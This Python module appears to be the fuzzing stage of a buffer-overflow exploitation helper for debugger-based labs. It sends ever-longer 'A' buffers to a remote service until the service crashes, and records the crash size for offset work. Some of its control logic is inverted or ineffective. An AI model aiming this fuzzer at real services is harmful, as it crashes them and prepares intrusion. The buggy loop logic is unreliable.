import socket, time
from BunnyConfig import BunnyConfig
from BunnyBanners import BunnyBanners
from BunnyValidator import BunnyValidator
from termcolor import colored


class BunnyFuzz:
    offset = 0

    @staticmethod
    def Fuzz():

        BunnyBanners.PrintFuzzBanner()

        print(colored("We are going to fuzz the vulnerable service. To do this, ensure that the vulnerable program is\n"
                      "loaded and running inside Immunity on the target box. The script will send a series of\n"
                      "payloads that increase in size from 100 to 3000 to attempt to crash the service. Your job is\n"
                      "to watch the lower right side of the debugger and the script output to see at which point\n"
                      "immunity goes from 'Running' to 'Paused'. You do not need to be exact, we just want to get a\n"
                      "ballpark figure. So for example, if you see the debugger pause when the script sends a payload\n"
                      "with a character count of 700, you will enter 700 into the prompt.\n\n", "green"))
        input(colored("Press enter to start... ", "yellow"))

        while True:
            # Create an array of increasing length buffer strings.
            buffer = []
            currentCount = ""
            iteration = 0
            counter = BunnyFuzz.offset + 100
            while len(buffer) < 30:
                buffer.append(b"A" * counter)
                counter += 100

            offset = counter
            print(colored("\nConnecting to " + BunnyConfig.remote_ip + " on port " + str(BunnyConfig.remote_port) + "\n\n", "green"))

            for string in buffer:
                try:

                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(BunnyConfig.socketTimeout)
                    connect = s.connect((BunnyConfig.remote_ip, BunnyConfig.remote_port))

                    currentCount = str(len(string))
                    print("Sending input with char count: " + currentCount)
                    s.send(BunnyConfig.operation + b" " + string)
                    s.close()
                    iteration = iteration + 1
                except:
                    print("\nCrashed on iteration: " + str(iteration) + "... string length was: " + str(currentCount))
                    input(colored("\nFuzzing failed! Press enter to return to the main menu!", "red"))
                    return False
                time.sleep(1)

            confirm = input(colored("\n\nDid the program crash (Y/n)? ", "yellow"))

            if confirm != 'y' and confirm != 'Y' and confirm != '':
                runAgain = input(colored("Would you like to increase the character count and run it again?", "yellow"))
                if runAgain != 'y' and runAgain != 'Y' and runAgain != '':
                    continue
                else:
                    print(colored("\nIt looks like the chosen operation may not be vulnerable. Please try fuzzing "
                                  "another operation.", "red"))
                    return
            else:
                break

        crashCount = input(colored("\n\nWhen did you notice the program crash? ", 'yellow'))

        while not BunnyValidator.IsValidEipOffset(crashCount):
            crashCount = input(colored("\n\nWhen did you notice the program crash? ", 'yellow'))

        BunnyConfig.crashCount = int(crashCount)

        input(colored("\n\nFuzzing complete!", "green"))

        return True
